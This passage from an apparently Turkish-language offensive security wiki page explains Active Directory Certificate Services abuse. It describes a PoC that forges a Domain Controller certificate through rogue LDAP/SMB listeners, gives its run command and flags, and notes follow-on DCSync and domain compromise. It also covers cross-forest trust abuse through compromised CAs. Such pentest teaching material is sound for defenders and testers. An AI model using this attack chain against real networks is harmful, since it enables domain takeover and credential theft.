- Bir computer account **create** veya **reuse** edebilme yeteneği
- **CA** tarafından attacker-controlled **`389`** ve **`445`** portlarına network reachability
- Vulnerable / unpatched CA request path (**July 14, 2026** tarihli Microsoft update, **`cdc`** için **DC validation** ve **resolved-SID comparison** ekledi)

Ortaya çıkan **`.pfx`**, ardından **PKINIT** için kullanılabilir; bu işlem bir **`.ccache`** ve published PoC flow'da **target DC NT hash** üretir. Bu değer normalde **full domain compromise** için yeterlidir.

### Abuse

Public PoC tüm chain'i otomatikleştirir:<sup>[[1]](#references)</sup>

1. Attacker-controlled bir **machine account** oluşturur veya mevcut olanı yeniden kullanır.
2. `389` ve `445` üzerinde **rogue LDAP and SMB/LSA listeners** başlatır.
3. Attacker-controlled **`cdc`** ve target **`rmd`** attributes değerlerini içeren bir certificate request gönderir.
4. CA'nın controlled machine account olarak rogue listeners'a authenticate olmasını sağlar; ancak identity lookups yanıtlarında **target DC** attributes değerlerini döndürür.
5. CA-signed bir **DC certificate** alır ve ardından bunu **PKINIT** için kullanır.
```bash
sudo python3 certighost.py -d playground.local -u lowpriv -p 'Password1234' --dc-ip 192.168.1.10
```
PoC'deki kullanışlı runtime flag'leri:

- `--listener <ip>`: `cdc` içinde duyurulan callback IP'sini açıkça seçer
- `--computer-name <NAME$>`: yeni bir makine hesabı oluşturmak yerine mevcut bir makine hesabını yeniden kullanır

**Operasyonel notlar:**

- PoC, **privileged port**'lar olan `389` ve `445`'e bind olduğu için **root** gerektirir.
- Başarılı exploitation, yerel olarak bir **DC `.pfx`** ve **Kerberos `.ccache`** yazar.
- Sertifika bir **Domain Controller hesabına** eşlendiğinden, sonraki işlemler arasında **certificate-based Kerberos auth**, **DCSync** ve kurtarılan **machine NT hash**'in yeniden kullanılması bulunabilir.<sup>[[2]](#references)</sup>

## Forest'ların Certificates ile Compromise Edilmesi: Açıklama

### Compromised CA'ler ile Forest Trust'ların Kırılması

**Cross-forest enrollment** yapılandırması nispeten kolaylaştırılmıştır. Resource forest'taki **root CA certificate**, yöneticiler tarafından **account forest'lara publish edilir** ve resource forest'taki **enterprise CA** sertifikaları, her account forest'taki **`NTAuthCertificates` ve AIA container'larına eklenir**. Açıklamak gerekirse bu düzenleme, resource forest'taki **CA'ye**, PKI'sini yönettiği diğer tüm forest'lar üzerinde tam kontrol sağlar. Bu CA'nın **attacker'lar tarafından compromise edilmesi** durumunda, hem resource hem de account forest'larda bulunan tüm kullanıcılar için sertifikalar onlar tarafından **forge edilebilir** ve böylece forest'ın security boundary'si kırılabilir.<sup>[[6]](#references)</sup>

### Foreign Principal'lara Verilen Enrollment Privilege'ları

Multi-forest ortamlarda, **Authenticated Users veya foreign principal'lara** (Enterprise CA'nin ait olduğu forest dışındaki kullanıcılar/gruplar) **enrollment ve edit rights** tanıyan **certificate template**'leri publish eden Enterprise CA'ler konusunda dikkatli olunması gerekir.\
Bir trust üzerinden authentication gerçekleştirildiğinde, **Authenticated Users SID'si** AD tarafından kullanıcının token'ına eklenir. Bu nedenle bir domain, **Authenticated Users'a enrollment rights tanıyan** bir template'e sahip Enterprise CA içeriyorsa, başka bir forest'taki bir kullanıcı potansiyel olarak bir template'e **enroll olabilir**. Benzer şekilde, bir template tarafından **enrollment rights açıkça bir foreign principal'a veriliyorsa**, bir **cross-forest access-control relationship** oluşturulmuş olur ve bir forest'taki principal'ın başka bir forest'taki template'e **enroll olması** sağlanır.

Her iki senaryo da bir forest'tan diğerine **attack surface'in artmasına** yol açar. Certificate template'in ayarları, bir attacker tarafından foreign domain'de ek privilege'lar elde etmek için exploit edilebilir.<sup>[[6]](#references)</sup>


## References

- [1] [aniqfakhrul/CVE-2026-54121 PoC deposu](https://github.com/aniqfakhrul/CVE-2026-54121)
- [2] [H0j3n - Certighost teknik analizi](https://gist.github.com/H0j3n/a5ef2609b5f2944ac2390a191a534c26)
- [3] [Certify 2.0 – SpecterOps Blog'u](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [4] [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [5] [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- [6] [SpecterOps – Certified Pre-Owned: Active Directory Certificate Services'in Kötüye Kullanılması](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [7] [Oliver Lyak – Certipy 4.0: ESC9, ESC10, BloodHound GUI, Yeni Authentication ve Request Method'ları ve daha fazlası](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [8] [SpecterOps – Shadow Credentials: Account Takeover için Key Trust Account Mapping'in Kötüye Kullanılması](https://specterops.io/blog/2021/06/17/shadow-credentials-abusing-key-trust-account-mapping-for-account-takeover/)
- [9] [CQure Academy – Enhanced Key (mis)Usage Hikâyesi](https://cqureacademy.com/blog/enhanced-key-usage)
- [10] [Compass Security – RPC üzerinden AD Certificate Services'e Relay](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/)
- [11] [hajo – ESC12: YubiHSM ile ADCS CA'ye Shell access](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm)
- [12] [SpecterOps – ADCS ESC13 Abuse Technique](https://specterops.io/blog/2024/02/14/adcs-esc13-abuse-technique/)
- [13] [SpecterOps – ADCS ESC14 Abuse Technique](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
- [14] [Certipy Wiki – Privilege Escalation (ESC1-ESC17)](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation)
- [15] [TrustedSec – EKUwu: Sadece Başka Bir AD CS ESC Değil](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)
- [16] [Furious5 – AD CS ESC16: Misconfiguration ve Exploitation](https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6)
{{#include ../../../banners/hacktricks-training.md}}
